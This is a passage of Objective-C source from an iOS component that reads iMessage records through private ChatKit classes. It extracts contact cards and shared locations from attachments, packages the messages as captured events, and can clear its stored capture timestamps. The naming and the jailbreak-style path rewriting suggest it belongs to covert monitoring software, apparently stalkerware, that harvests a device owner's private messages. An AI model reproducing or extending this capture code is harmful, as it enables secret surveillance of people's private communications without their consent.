                Class $CKLocationMediaObject = objc_getClass("CKLocationMediaObject");  // Location file (CKLocationMediaObject subclass of CKContactMediaObject)
                
                for (CKMediaObject *mediaObject in message.mediaObjects) {
                    NSURL *fileURL = [NSURL fileURLWithPath:[mediaObject filename]]; // Below iOS 8
                    if ([mediaObject respondsToSelector:@selector(fileURL)]) { // iOS 8
                        fileURL = [mediaObject fileURL];
                    }
                    NSString *filePath = [fileURL path];
                    filePath = [filePath stringByReplacingOccurrencesOfString:@"/var/root/" withString:@"/var/mobile/"];
                    NSString *savedFilePath = [NSString stringWithFormat:@"%@%f%@", [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject], [[message date] timeIntervalSince1970], [fileURL lastPathComponent]];
                    
                    DLog(@"mediaObject class    = %@", [mediaObject class]);
                    DLog(@"savedFilePath        = %@", savedFilePath);
                    DLog(@"filePath             = %@", filePath);
                    DLog(@"fileURL              = %@", fileURL);
                    DLog(@"fileURL, path        = %@", [fileURL path]);
                    
                    if ([mediaObject isKindOfClass:$CKLocationMediaObject]) {
                        DLog(@"Location file");
                        locNameAddr = [self locationNameAddressWithLocationFileURL:[NSURL fileURLWithPath:filePath]];
                        DLog(@"locNameAddr = %@", locNameAddr);
                    } else if ([mediaObject isKindOfClass:$CKContactMediaObject] ||
                               [mediaObject isKindOfClass:$CKVCardMediaObject]) {
                        DLog(@"Contact file");
                        NSData *vCardData = [NSData dataWithContentsOfFile:filePath];
                        DLog(@"vCardData length = %lu", (unsigned long)[vCardData length]);
                        contactName = [AddressbookUtils getVCardStringFromData:vCardData];
                        DLog(@"contactName = %@", contactName);
                    }
                }
                
                NSString *copyMessage = contactName != nil ? contactName : locNameAddr;
                FxIMEvent *copyEvent = [iMessageEvent copyWithZone:nil];
                [copyEvent setMMessage:copyMessage];
                [copyEvent setMAttachments:nil];
                
                [sortediMessageArray addObject:copyEvent];
                
                [copyEvent release];
            }
            
            [iMessageEvent release];
        }];
        
        if (aMaxNumber > sortediMessageArray.count) {
            aMaxNumber = sortediMessageArray.count;
        }
        
        NSMutableArray *tempArray = [NSMutableArray array];
        
        NSArray* tempSomeiMessages = [NSArray arrayWithArray:[sortediMessageArray subarrayWithRange:NSMakeRange(0, aMaxNumber)]];
        [sortediMessageArray release];
        
        for (FxIMEvent *event in tempSomeiMessages) {
            NSArray *events = [FxIMEventUtils digestIMEvent:event];
            [tempArray addObjectsFromArray:events];
        }
        
        someiMessages = tempArray;

    }
    @catch (NSException *exception) {
        DLog(@"NS exception = %@", exception);
    }
    @catch (...) {
        DLog(@"Unknown exception");
    }
    @finally {
        ;
    }
    DLog(@"Some iMessages is captured, %lu", (unsigned long)[someiMessages count]);
    return (someiMessages);
}

#pragma mark - Clear Util

+ (void)clearCapturedData
{
    // Remove last capture time stemp for each event
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
    
    //Call log
    if (![fileManager removeItemAtPath:[path stringByAppendingPathComponent:@"lastiMessages.plist"] error:&error]) {
        DLog(@"Remove last iMessage plist error with %@", [error localizedDescription]);
    }
}


- (void) dealloc {
	[super dealloc];
}

@end
